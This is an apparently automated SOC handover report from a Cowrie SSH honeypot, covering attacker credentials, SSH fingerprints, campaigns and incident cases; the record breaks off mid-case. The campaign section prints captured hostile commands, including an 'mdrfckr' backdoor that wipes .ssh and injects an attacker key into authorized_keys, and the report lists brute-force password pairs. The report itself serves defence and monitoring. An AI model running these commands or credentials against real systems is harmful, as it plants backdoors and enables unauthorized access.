# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-12 |
| **Generated At** | 2026-07-12T15:01:29Z |
| **Shift Time** | 15:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **287** |
| Confirmed Threats | **251** |
| False Positives Filtered | **36** (12.5%) |
| Unique Attacker IPs | **74** |
| Countries of Origin | **28** |
| High Severity Cases | **197** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **90** |
| Malware Samples Analyzed | **4** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **245** |
| Unique Credential Pairs | **186** |
| Unique Usernames | **131** |
| Unique Passwords | **150** |
| Successful Auth Pairs | **219** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `345gs5662d34` | 13 |
| `admin` | 11 |
| `ubuntu` | 7 |
| `temp` | 6 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 13 |
| `3245gs5662d34` | 13 |
| `admin` | 8 |
| `temp` | 6 |
| `support` | 5 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 13 |
| `temp` | `temp` | 6 |
| `admin` | `admin` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `support` | `support` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `zx` | `zx@123` | `10.0.0.73` | 2026-07-12T12:55:34 |
| `345gs5662d34` | `345gs5662d34` | `10.0.0.73` | 2026-07-12T12:55:37 |
| `zx` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T12:55:38 |
| `support` | `support` | `176.53.159.196` | 2026-07-12T12:56:15 |
| `support` | `support` | `10.0.0.73` | 2026-07-12T12:56:31 |
| `ubuntu` | `test` | `116.48.150.115` | 2026-07-12T12:57:00 |
| `ubuntu` | `test` | `10.0.0.73` | 2026-07-12T12:57:16 |
| `tomcat` | `tomcat123` | `185.242.3.195` | 2026-07-12T13:01:32 |
| `root` | `0000` | `14.33.96.3` | 2026-07-12T13:02:19 |
| `root` | `0000` | `196.188.187.205` | 2026-07-12T13:02:28 |
| `root` | `0000` | `203.198.173.145` | 2026-07-12T13:05:58 |
| `czb` | `czb123` | `2.58.172.185` | 2026-07-12T13:10:22 |
| `tomcat` | `tomcat123` | `10.0.0.73` | 2026-07-12T13:16:22 |
| `prod` | `123` | `217.128.120.43` | 2026-07-12T13:17:13 |
| `345gs5662d34` | `345gs5662d34` | `217.128.120.43` | 2026-07-12T13:17:15 |
| `prod` | `3245gs5662d34` | `217.128.120.43` | 2026-07-12T13:17:16 |
| `root` | `g_czechout` | `112.197.2.116` | 2026-07-12T13:19:02 |
| `guest` | `12345` | `10.0.0.73` | 2026-07-12T13:19:55 |
| `admin` | `qwerty1` | `111.70.7.189` | 2026-07-12T13:22:40 |
| `admin` | `qwerty1` | `118.183.180.108` | 2026-07-12T13:22:53 |
| `admin` | `qwerty1` | `10.0.0.73` | 2026-07-12T13:22:58 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-12T13:25:07 |
| `dev` | `123456789` | `192.140.185.8` | 2026-07-12T13:27:42 |
| `hc` | `hc123` | `37.143.61.84` | 2026-07-12T13:31:01 |
| `345gs5662d34` | `345gs5662d34` | `37.143.61.84` | 2026-07-12T13:31:03 |
| `hc` | `3245gs5662d34` | `37.143.61.84` | 2026-07-12T13:31:04 |
| `admin` | `administrator` | `10.0.0.73` | 2026-07-12T13:31:56 |
| `ram` | `1234` | `10.0.0.73` | 2026-07-12T13:33:13 |
| `ram` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T13:33:16 |
| `esadmin` | `esadmin@2024` | `10.0.0.73` | 2026-07-12T13:34:01 |
| `esadmin` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T13:34:07 |
| `root` | `qhdidc@` | `185.242.3.195` | 2026-07-12T13:35:09 |
| `james` | `jamesjames` | `10.0.0.73` | 2026-07-12T13:36:22 |
| `info` | `password123` | `10.0.0.73` | 2026-07-12T13:39:26 |
| `info` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T13:39:30 |
| `nobody` | `password321` | `187.126.105.42` | 2026-07-12T13:48:05 |
| `nobody` | `password321` | `213.154.80.51` | 2026-07-12T13:48:12 |
| `root` | `qhdidc@` | `10.0.0.73` | 2026-07-12T13:50:29 |
| `marcel` | `marcel` | `203.252.10.4` | 2026-07-12T13:57:03 |
| `marcel` | `marcel` | `24.142.170.231` | 2026-07-12T13:57:10 |
| `marcel` | `marcel` | `10.0.0.73` | 2026-07-12T13:57:21 |
| `root` | `LeitboGi0ro` | `165.1.75.106` | 2026-07-12T14:00:08 |
| `root` | `123@@@` | `165.1.75.106` | 2026-07-12T14:00:10 |
| `test` | `Passw0rd` | `181.114.93.153` | 2026-07-12T14:08:33 |
| `test` | `Passw0rd` | `182.151.45.136` | 2026-07-12T14:08:44 |
| `root` | `qazwsx123456789` | `10.0.0.73` | 2026-07-12T14:09:36 |
| `root` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T14:09:41 |
| `ubuntu` | `upload1234567` | `185.242.3.195` | 2026-07-12T14:09:44 |
| `barcelona` | `barcelona` | `10.0.0.73` | 2026-07-12T14:10:39 |
| `barcelona` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T14:11:11 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `74.82.47.4` | 2026-07-12T14:11:24 |
| `root` | `password` | `91.92.40.176` | 2026-07-12T14:12:04 |
| `debian` | `abcd1234` | `112.120.115.152` | 2026-07-12T14:13:49 |
| `debian` | `abcd1234` | `182.60.128.241` | 2026-07-12T14:13:58 |
| `root` | `admin` | `91.92.40.176` | 2026-07-12T14:14:39 |
| `root` | `123@@@` | `144.22.238.238` | 2026-07-12T14:15:01 |
| `root` | `LeitboGi0ro` | `144.22.238.238` | 2026-07-12T14:15:02 |
| `root` | `smo@@kkklss` | `144.22.238.238` | 2026-07-12T14:15:06 |
| `root` | `haim` | `69.74.29.21` | 2026-07-12T14:16:58 |
| `345gs5662d34` | `345gs5662d34` | `69.74.29.21` | 2026-07-12T14:16:59 |
| `root` | `3245gs5662d34` | `69.74.29.21` | 2026-07-12T14:16:59 |
| `root` | `toor` | `91.92.40.176` | 2026-07-12T14:17:23 |
| `blank` | `6666666666` | `103.251.143.14` | 2026-07-12T14:19:15 |
| `root` | `12345` | `91.92.40.176` | 2026-07-12T14:20:05 |
| `root` | ` ` | `51.75.200.186` | 2026-07-12T14:21:21 |
| `root` | `123456789` | `91.92.40.176` | 2026-07-12T14:22:33 |
| `ubuntu` | `upload1234567` | `10.0.0.73` | 2026-07-12T14:24:52 |
| `root` | `12345678` | `91.92.40.176` | 2026-07-12T14:24:59 |
| `root` | `kimi` | `41.204.82.238` | 2026-07-12T14:26:56 |
| `345gs5662d34` | `345gs5662d34` | `41.204.82.238` | 2026-07-12T14:26:59 |
| `root` | `3245gs5662d34` | `41.204.82.238` | 2026-07-12T14:27:00 |
| `root` | `passw0rd` | `91.92.40.176` | 2026-07-12T14:27:28 |
| `root` | `admin123` | `91.92.40.176` | 2026-07-12T14:29:59 |
| `x` | `x` | `196.190.180.18` | 2026-07-12T14:30:24 |
| `root` | `1234` | `91.92.40.176` | 2026-07-12T14:32:37 |
| `x` | `x` | `111.70.32.53` | 2026-07-12T14:34:06 |
| `root` | `qwerty` | `91.92.40.176` | 2026-07-12T14:35:17 |
| `temp` | `temp` | `178.178.222.58` | 2026-07-12T14:35:48 |
| `temp` | `temp` | `49.124.149.211` | 2026-07-12T14:36:02 |
| `root` | `letmein` | `91.92.40.176` | 2026-07-12T14:38:00 |
| `root` | `12345` | `154.90.70.142` | 2026-07-12T14:38:17 |
| `root` | `admin` | `154.90.70.142` | 2026-07-12T14:38:27 |
| `root` | `1234` | `154.90.70.142` | 2026-07-12T14:38:42 |
| `user` | `pass` | `154.90.70.142` | 2026-07-12T14:38:50 |
| `root` | `system` | `154.90.70.142` | 2026-07-12T14:39:00 |
| `root` | `password` | `154.90.70.142` | 2026-07-12T14:39:08 |
| `promo` | `123456` | `10.0.0.73` | 2026-07-12T14:39:13 |
| `admin` | `admin1234` | `154.90.70.142` | 2026-07-12T14:39:18 |
| `temp` | `temp` | `213.101.138.172` | 2026-07-12T14:39:19 |
| `promo` | `3245gs5662d34` | `10.0.0.73` | 2026-07-12T14:39:19 |
| `root` | `` | `154.90.70.142` | 2026-07-12T14:39:29 |
| `temp` | `temp` | `65.20.211.96` | 2026-07-12T14:39:31 |
| `default` | `default` | `154.90.70.142` | 2026-07-12T14:39:39 |
| `temp` | `temp` | `10.0.0.73` | 2026-07-12T14:39:40 |
| `admin` | `admin` | `154.90.70.142` | 2026-07-12T14:39:53 |
| `user` | `user` | `154.90.70.142` | 2026-07-12T14:40:05 |
| `user` | `password` | `154.90.70.142` | 2026-07-12T14:40:16 |
| `admin` | `` | `154.90.70.142` | 2026-07-12T14:40:32 |
| `root` | `Password1` | `91.92.40.176` | 2026-07-12T14:40:40 |
| `debian` | `debian` | `154.90.70.142` | 2026-07-12T14:40:45 |
| `ubuntu` | `ubuntu` | `154.90.70.142` | 2026-07-12T14:40:56 |
| `kali` | `kali` | `154.90.70.142` | 2026-07-12T14:41:07 |
| `root` | `123123` | `91.92.40.176` | 2026-07-12T14:43:24 |
| `ubuntu` | `12341234` | `185.242.3.195` | 2026-07-12T14:43:34 |
| `jfletcher` | `esearch` | `91.92.47.123` | 2026-07-12T14:44:44 |
| `sachin` | `devuser` | `91.92.47.123` | 2026-07-12T14:44:53 |
| `us13` | `ai` | `91.92.47.123` | 2026-07-12T14:44:58 |
| `es` | `Root@123` | `91.92.47.123` | 2026-07-12T14:45:05 |
| `hatter` | `11111111` | `91.92.47.123` | 2026-07-12T14:45:11 |
| `alexander` | `123456` | `91.92.47.123` | 2026-07-12T14:45:17 |
| `s10akin` | `myuser` | `91.92.47.123` | 2026-07-12T14:45:22 |
| `user` | `data` | `91.92.47.123` | 2026-07-12T14:45:28 |
| `webadmin` | `00000000` | `91.92.47.123` | 2026-07-12T14:45:34 |
| `33sqn` | `openvpn` | `91.92.47.123` | 2026-07-12T14:45:40 |
| `s10fmj` | `123321` | `91.92.47.123` | 2026-07-12T14:45:45 |
| `oscar` | `kingbase` | `91.92.47.123` | 2026-07-12T14:45:51 |
| `имени` | `frappe123` | `91.92.47.123` | 2026-07-12T14:45:56 |
| `us23` | `admin` | `91.92.47.123` | 2026-07-12T14:46:03 |
| `root` | `111111` | `91.92.40.176` | 2026-07-12T14:46:07 |
| `nkonduri` | `drcomadmin123` | `91.92.47.123` | 2026-07-12T14:46:09 |
| `root` | `soporte` | `91.92.47.123` | 2026-07-12T14:46:14 |
| `svutukuri` | `user4` | `91.92.47.123` | 2026-07-12T14:46:20 |
| `plex1` | `odoo18` | `91.92.47.123` | 2026-07-12T14:46:26 |
| `us30` | `onkar123` | `91.92.47.123` | 2026-07-12T14:46:32 |
| `sonar` | `app` | `91.92.47.123` | 2026-07-12T14:46:40 |
| `whbadmin` | `rajvir123` | `91.92.47.123` | 2026-07-12T14:46:44 |
| `hdfs` | `test1` | `91.92.47.123` | 2026-07-12T14:46:50 |
| `styx` | `app` | `91.92.47.123` | 2026-07-12T14:46:55 |
| `a1samka` | `joel` | `91.92.47.123` | 2026-07-12T14:47:01 |
| `root` | `123@@@` | `129.153.145.135` | 2026-07-12T14:47:06 |
| `init` | `741852963` | `91.92.47.123` | 2026-07-12T14:47:07 |
| `root` | `LeitboGi0ro` | `129.153.145.135` | 2026-07-12T14:47:07 |
| `algoman` | `osmc` | `91.92.47.123` | 2026-07-12T14:47:12 |
| `s9teeyira` | `123` | `91.92.47.123` | 2026-07-12T14:47:17 |
| `amine` | `Pass1234` | `91.92.47.123` | 2026-07-12T14:47:23 |
| `s7pierre` | `rocky` | `91.92.47.123` | 2026-07-12T14:47:29 |
| `jinruihong` | `null` | `91.92.47.123` | 2026-07-12T14:47:36 |
| `user32` | `steam` | `91.92.47.123` | 2026-07-12T14:47:42 |
| `root` | `speed@123` | `10.0.0.73` | 2026-07-12T14:47:46 |
| `suraj` | `debian` | `91.92.47.123` | 2026-07-12T14:47:48 |
| `eth1` | `postgres123` | `91.92.47.123` | 2026-07-12T14:47:54 |
| `gokul` | `dev123456` | `91.92.47.123` | 2026-07-12T14:48:00 |
| `darth_vader` | `123321` | `91.92.47.123` | 2026-07-12T14:48:05 |
| `sftp` | `0000` | `91.92.47.123` | 2026-07-12T14:48:11 |
| `s7deji` | `odoo17` | `91.92.47.123` | 2026-07-12T14:48:17 |
| `russo` | `Tiki2025@!` | `91.92.47.123` | 2026-07-12T14:48:23 |
| `dolphinscheduler` | `developer` | `91.92.47.123` | 2026-07-12T14:48:29 |
| `us59` | `qwer1234` | `91.92.47.123` | 2026-07-12T14:48:35 |
| `nexus` | `1029384756` | `91.92.47.123` | 2026-07-12T14:48:41 |
| `s8jerry` | `administrator` | `91.92.47.123` | 2026-07-12T14:48:47 |
| `root` | `default` | `91.92.40.176` | 2026-07-12T14:48:51 |
| `s8zuby` | `Aa123456.` | `91.92.47.123` | 2026-07-12T14:48:53 |
| `Victor-rt-ad-nx-372893` | `user2` | `91.92.47.123` | 2026-07-12T14:48:59 |
| `t6` | `abcd1234` | `91.92.47.123` | 2026-07-12T14:49:05 |
| `pbsdata` | `root1` | `91.92.47.123` | 2026-07-12T14:49:10 |
| `ps` | `gitlab` | `91.92.47.123` | 2026-07-12T14:49:16 |
| `lucunli` | `kingbase` | `91.92.47.123` | 2026-07-12T14:49:22 |
| `s9jerome` | `playground` | `91.92.47.123` | 2026-07-12T14:49:27 |
| `andrew` | `teamspeak` | `91.92.47.123` | 2026-07-12T14:49:33 |
| `sergey` | `prefect` | `91.92.47.123` | 2026-07-12T14:49:38 |
| `user19` | `es123456` | `91.92.47.123` | 2026-07-12T14:49:44 |
| `secscan` | `ranger` | `91.92.47.123` | 2026-07-12T14:49:50 |
| `mobiquity` | `ai` | `91.92.47.123` | 2026-07-12T14:49:55 |
| `zomboid` | `debian` | `91.92.47.123` | 2026-07-12T14:50:00 |
| `paperclip` | `dolphinscheduler123` | `91.92.47.123` | 2026-07-12T14:50:06 |
| `sally` | `changeme` | `91.92.47.123` | 2026-07-12T14:50:13 |
| `taha` | `root12345` | `91.92.47.123` | 2026-07-12T14:50:18 |
| `fred` | `rootroot` | `91.92.47.123` | 2026-07-12T14:50:23 |
| `5902` | `amine` | `91.92.47.123` | 2026-07-12T14:50:28 |
| `atvm` | `linux` | `91.92.47.123` | 2026-07-12T14:50:34 |
| `user37` | `A123456a` | `91.92.47.123` | 2026-07-12T14:50:40 |
| `s7claire` | `postgres` | `91.92.47.123` | 2026-07-12T14:50:45 |
| `arpwatch` | `student123` | `91.92.47.123` | 2026-07-12T14:50:50 |
| `ambari-qa` | `a` | `91.92.47.123` | 2026-07-12T14:50:56 |
| `russo` | `1Q2w3e4r` | `91.92.47.123` | 2026-07-12T14:51:01 |
| `a1danniella` | `nobody` | `91.92.47.123` | 2026-07-12T14:51:07 |
| `shanghaixinwei` | `ali` | `91.92.47.123` | 2026-07-12T14:51:13 |
| `chenminyang` | `abc123` | `91.92.47.123` | 2026-07-12T14:51:18 |
| `5926` | `claude123` | `91.92.47.123` | 2026-07-12T14:51:24 |
| `sandeep` | `Qq123456` | `91.92.47.123` | 2026-07-12T14:51:30 |
| `root` | `system` | `91.92.40.176` | 2026-07-12T14:51:34 |
| `5926` | `support` | `91.92.47.123` | 2026-07-12T14:51:36 |
| `andrei` | `a123456A` | `91.92.47.123` | 2026-07-12T14:51:42 |
| `leo1` | `steam123` | `91.92.47.123` | 2026-07-12T14:51:47 |
| `root` | `saeed` | `10.0.0.73` | 2026-07-12T14:51:51 |
| `sysops` | `ftpuser` | `91.92.47.123` | 2026-07-12T14:51:53 |
| `ftp_client` | `vagrant` | `91.92.47.123` | 2026-07-12T14:51:58 |
| `yealink` | `zaq12wsx` | `91.92.47.123` | 2026-07-12T14:52:04 |
| `jeff` | `hadoop` | `91.92.47.123` | 2026-07-12T14:52:09 |
| `mohammadjafa` | `12345678` | `91.92.47.123` | 2026-07-12T14:52:16 |
| `yd02` | `jenkins@123` | `91.92.47.123` | 2026-07-12T14:52:21 |
| `ben_kenobi` | `fivem` | `91.92.47.123` | 2026-07-12T14:52:27 |
| `person` | `kubernetes` | `91.92.47.123` | 2026-07-12T14:52:33 |
| `us70` | `es123456` | `91.92.47.123` | 2026-07-12T14:52:39 |
| `CG05` | `abc123` | `91.92.47.123` | 2026-07-12T14:52:44 |
| `tez` | `rocky` | `91.92.47.123` | 2026-07-12T14:52:51 |
| `kms` | `labuser` | `91.92.47.123` | 2026-07-12T14:52:56 |
| `pey13` | `tactical` | `91.92.47.123` | 2026-07-12T14:53:02 |
| `s7forseh` | `ghost` | `91.92.47.123` | 2026-07-12T14:53:08 |
| `us33` | `qwe123` | `91.92.47.123` | 2026-07-12T14:53:14 |
| `arthur` | `factorio` | `91.92.47.123` | 2026-07-12T14:53:19 |
| `nutanix` | `1234qwer` | `91.92.47.123` | 2026-07-12T14:53:25 |
| `xinzhu3gongyi` | `qwer1234` | `91.92.47.123` | 2026-07-12T14:53:30 |
| `mongodb` | `cloud` | `91.92.47.123` | 2026-07-12T14:53:36 |
| `kims` | `operator` | `91.92.47.123` | 2026-07-12T14:53:42 |
| `root` | `optimus` | `91.92.47.123` | 2026-07-12T14:53:48 |
| `rajadeepan` | `abc123456` | `91.92.47.123` | 2026-07-12T14:53:54 |
| `user01` | `1234qwer` | `91.92.47.123` | 2026-07-12T14:54:00 |
| `ben` | `welcome1` | `91.92.47.123` | 2026-07-12T14:54:06 |
| `gl08` | `www` | `91.92.47.123` | 2026-07-12T14:54:11 |
| `git` | `gg` | `91.92.47.123` | 2026-07-12T14:54:17 |
| `wsl` | `abcd@1234` | `91.92.47.123` | 2026-07-12T14:54:23 |
| `bitnami` | `hduser` | `91.92.47.123` | 2026-07-12T14:54:29 |
| `eagle11bench20` | `rock` | `91.92.47.123` | 2026-07-12T14:54:34 |
| `sambauser` | `test@123` | `91.92.47.123` | 2026-07-12T14:54:40 |
| `tux` | `eve` | `91.92.47.123` | 2026-07-12T14:54:46 |
| `user32` | `dspace` | `91.92.47.123` | 2026-07-12T14:54:51 |
| `kishorev` | `root1234` | `91.92.47.123` | 2026-07-12T14:54:58 |
| `b` | `a` | `152.32.171.184` | 2026-07-12T14:55:01 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **287** |
| Sessions with Fingerprint | **11** |
| Unique HASSH Fingerprints | **11** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 157 |
| OpenSSH | 23 |
| libssh | 23 |
| Paramiko (Python) | 9 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `0a07365cc01f...` | Generic scanner | 107 | 1 |
| `16443846184e...` | Generic scanner | 27 | 4 |
| `acaa53e0a7d7...` | Mirai/variant | 23 | 23 |
| `2ec37a7cc8da...` | Mirai/variant | 18 | 1 |
| `f555226df196...` | Mirai/variant | 15 | 7 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `0a07365cc01f...` | Go SSH scanner | 107 | 1 | Generic scanner |
| `16443846184e...` | Go SSH scanner | 27 | 4 | Generic scanner |
| `acaa53e0a7d7...` | OpenSSH | 23 | 23 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 18 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 15 | 7 | Mirai/variant |
| `a2de0f306611...` | Paramiko (Python) | 9 | 3 | Mirai/variant |
| `95420f9d932d...` | libssh | 8 | 3 | — |
| `eff4c24daffc...` | Go SSH scanner | 2 | 1 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **8** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Recon Loader Script** | 🟡 MEDIUM | 16 | 1 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 4 | `T1021.004, T1078, T1070, T1140` |

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `91.92.40.176`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.74.29.21`, `41.204.82.238`, `217.128.120.43`, `37.143.61.84`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **74** |
| Unique ASNs | **54** |
| High-Risk ASNs | **46** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS22773` | Cox Communications Inc. | 4 | MEDIUM |
| `AS46562` | Performive LLC | 4 | MEDIUM |
| `AS4760` | HKT Limited | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 3 | HIGH |
| `AS31898` | Oracle Corporation | 3 | HIGH |
| `AS16276` | OVH SAS | 2 | HIGH |
| `AS24757` | Ethio Telecom | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (180)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-728a1d6edf2d

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-12 12:56 |
| **Last Seen** | 2026-07-12 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 12:56:15` | `cowrie.session.connect` |
| `2026-07-12 12:56:15` | `cowrie.client.version` |
| `2026-07-12 12:56:15` | `cowrie.client.kex` |
| `2026-07-12 12:56:15` | `cowrie.login.success` |
| `2026-07-12 12:56:16` | `cowrie.direct-tcpip.request` |
| `2026-07-12 12:56:16` | `cowrie.direct-tcpip.data` |
| `2026-07-12 12:56:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80d11937267e

| Field | Detail |
|---|---|
| **Source IP** | `116.48.150[.]115` |
| **First Seen** | 2026-07-12 12:56 |
| **Last Seen** | 2026-07-12 12:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 12:56:57` | `cowrie.session.connect` |
| `2026-07-12 12:56:58` | `cowrie.client.version` |
| `2026-07-12 12:56:58` | `cowrie.client.kex` |
| `2026-07-12 12:57:00` | `cowrie.login.success` |
| `2026-07-12 12:57:01` | `cowrie.direct-tcpip.request` |
| `2026-07-12 12:57:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.48.150[.]115` to AbuseIPDB if not already reported
- [ ] Block `116.48.150[.]115` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-537ca47cf3dc

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-12 13:01 |
| **Last Seen** | 2026-07-12 13:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:01:32` | `cowrie.session.connect` |
| `2026-07-12 13:01:32` | `cowrie.client.version` |
| `2026-07-12 13:01:32` | `cowrie.client.kex` |
| `2026-07-12 13:01:32` | `cowrie.login.success` |
| `2026-07-12 13:01:33` | `cowrie.session.params` |
| `2026-07-12 13:01:33` | `cowrie.command.input` |
| `2026-07-12 13:01:35` | `cowrie.log.closed` |
| `2026-07-12 13:01:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7f757399cd

| Field | Detail |
|---|---|
| **Source IP** | `14.33.96[.]3` |
| **First Seen** | 2026-07-12 13:02 |
| **Last Seen** | 2026-07-12 13:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:02:16` | `cowrie.session.connect` |
| `2026-07-12 13:02:17` | `cowrie.client.version` |
| `2026-07-12 13:02:17` | `cowrie.client.kex` |
| `2026-07-12 13:02:19` | `cowrie.login.success` |
| `2026-07-12 13:02:20` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:02:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.33.96[.]3` to AbuseIPDB if not already reported
- [ ] Block `14.33.96[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aaa88f9b70dd

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]205` |
| **First Seen** | 2026-07-12 13:02 |
| **Last Seen** | 2026-07-12 13:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 13:02:26` | `cowrie.session.connect` |
| `2026-07-12 13:02:26` | `cowrie.client.version` |
| `2026-07-12 13:02:26` | `cowrie.client.kex` |
| `2026-07-12 13:02:28` | `cowrie.login.success` |
| `2026-07-12 13:02:30` | `cowrie.direct-tcpip.request` |
| `2026-07-12 13:02:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]205` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]205` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59d77f6032eb

| Field | Detail |
|---|---|
| **Source IP** | `203.198.173[.]145` |
| **First Seen** | 2026-07-12 13:05 |
